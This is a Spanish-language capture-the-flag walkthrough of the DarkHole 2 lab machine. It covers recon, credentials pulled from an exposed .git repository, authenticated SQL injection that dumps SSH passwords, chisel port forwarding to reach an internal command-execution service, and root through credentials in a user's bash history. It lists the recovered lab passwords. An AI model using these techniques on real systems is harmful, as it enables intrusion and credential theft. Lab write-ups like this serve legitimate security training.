# DarkHole 2

Tags: [[_infoLeakage]],[[_sqli]],[[_webExploitation]],[[_internalPortAbusing]],[[_sudoersAbusing]]

## Primeros pasos
(Reconocimiento).

Primero le acomodamos bien para que agarre una IP (poner modo Bridged).

Organizamos TMUX.
Hacemos un escaneo en la red para determinar la IP de la máquina.
Mediante el OUI reconocemos la máquina que vamos a atacar.

Le hacemos un ping a la máquina. (Está activa o no).
Posible máquina Linux.
Creamos un directorio como la IP o nombre de la máquina.
Ponemos la IP de la máquina en un lugar visible.
Creamos los directorios de trabajo.

Empezamos el escaneo con NMAP.

Buscamos codename con launchpad, un posible Ubuntu Focal.

Puertos abiertos.
22 - SSH 8.2

80 - HTTP. Ubuntu. (/.git)

## Investigación (Intrusión)
(Reconocimiento/Enumeración).

22.
No tenemos credenciales válidas.


80.
NMAP reporta: /git/ hay un repositorio, dice que se hizó un commit.
Las cabeceras solo dice que es apache.
El título es DarkHole.
Tiene cookies, PHPSESSID.

Pensemos en recomponer el repositorio, pero en un momento, veamos otras cosas.

whatweb. No dice mucho.

Veamos la web.
+Si ponemos /.git nos muestra cositas. Mmm, podría intentar clonarlo.
+El código fuente no dice mucho.
+Antes veamos funcionalidades de la web, pero no hay mucho.

Vemos un panel de autenticación.
Su código fuente hay algo, no tan raro, pero se ve un .html que no carga, dice Not Found.

Fuzzeemos.
/config :    ojito, hay un config.php, sin embargo lo interpreta, de cara a encontrar un LFI - RFI, podemos tratar de apuntar a este con un wrapper.

Fuzz por extensiones PHP.
/.php :    Forbidden
/sytyle/login.jpg :    podría pensar en esteganografía, pero de momento no.


No veo mucho más, así que tratemos de enviar en el login.php una SQLI, porque desde la web no se puede. Pero no parece ser vulnerable.

Nos traemos el /.git con wget -r
Y procedemos a enumerarlo
Vemos en un commit información.
Tenemos las credenciales del login.php
<span style="color:#ecacb6">lush@admin.com:321</span>

Entramos a un recurso <span style="color:#ecacb6">/dashboard.php?id=1</span>
Cositas.
En el mismo repositorio vemos un commit donde se ve cómo se hace la query, es peligroso eso, aunque antes sanitiza un poco, por eso no se suscitaba la SQLI.

Pero ya autenticados, parece que no se sanitiza mucho.

Probemos SQLI ya autenticados.
Se puede ^^
Ya empezamos a enumerar cosas, así que ha encontrar algo bueno.
DATOS.
Database en uso: darkhole_2

Databases: mysql,information_schema,performance_schema,sys,darkhole_2

Tables de darkhole_2: ssh,users
Columns ssh: id,pass,user
Columns users: address,contact_number,email,id,password,username

Tenemos de ssh, una credencial
<span style="color:#ecacb6">jehad:fool</span> 

Las probamos con ssh y pa deentro.


## Escalada

Enumerar todo el sistema.
Efectivamente, Ubuntu Focal.

Deberíamos analizar todos los archivos de la máquina.
Hay otros dos usuarios con su home
lama
losy

Debería ver los puertos internos que corren servicios para ver si los puertos 22 y 80 son los únicos.
También las posibles tareas cron.

Los puetos abiertos internos son:
22
53
3306
9999
33060

Qué raro que el 80 no esté.

Vemos el /.bash_history
Vemos que el puerto 9999 nos hace posible una ejecución de comandos.

Vemos que el 9999 es un http, que de forma externa no lo vemos, así que juguemos con chisel para convertir ese puerto 9999, en mi puerto 9999.

<span style="color:#88c425">ps -faux | grep "9999"</span> :    ver quién inició y dónde el servicio.

Parece que con curl podría ejecutarlo, pero con chisel estaría bien.

Ojito, nosotros podemos escribir en /opt/web, tener en cuenta.

Para ganar acceso, basta con url encodear la reverse shell y pa dentro, pero practiquemos con chisel.

Descargamos chisel.
https://github.com/jpillora/chisel/releases/tag/v1.9.1

Lo descomprimimos, damos permisos de ejecución.
Monto un server con python, y en la máquina víctima lo descargo con wget,

En la víctima correrá como cliente, y en mi equipo como servidor.

Primero. En mi máquina
<span style="color:#88c425">./chisel server -reerse -p 1234</span> :    corro el chisel en modo servidor, y vamos a hacer Remote Port Forwarding.

Corro un puerto, porque ahora en el modo cliente especifico dónde me voy a conectar.

En la máquina víctima
<span style="color:#88c425">./chisel client 192.168.0.13:1234 R:9999:127.0.0.1:9999</span>

Le digo que me quiero conectar a esa máquina por un puerto.
R:9999:127.0.0.1:9999 :    de Remote Port Forwarding, para que mi puerto 9999 se convierta en el puerto 9999 de la máquina víctima.

Si veo en mi máquina con <span style="color:#88c425">lsof -i:9999</span>
Veo que está ocupado por chisel.

Hacemos el RCE para ganar acceso desde la web ahora que la vemos, y pa deentro.

<span style="color:#bef202">Elevar a root.</span> 

Estando como losy, vemos su .bash_history
Vemos que ejecuta mysql y coloca sus credenciales.
<span style="color:#ecacb6">losy:gang</span>
Vemos que ejecuta python3 para spawnear una shell, lo hacemos y pa deeeeeentro.

